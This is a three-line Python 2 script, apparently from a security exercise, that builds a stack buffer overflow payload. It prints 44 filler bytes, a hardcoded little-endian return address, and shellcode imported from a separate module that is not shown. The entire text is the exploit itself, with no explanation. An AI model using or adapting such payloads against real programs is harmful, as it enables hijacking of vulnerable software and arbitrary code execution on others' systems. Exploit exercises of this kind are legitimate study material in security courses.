import struct
from shellcode import shellcode
print 'a'*44 + struct.pack('<I', 0xfffecd80) + shellcode
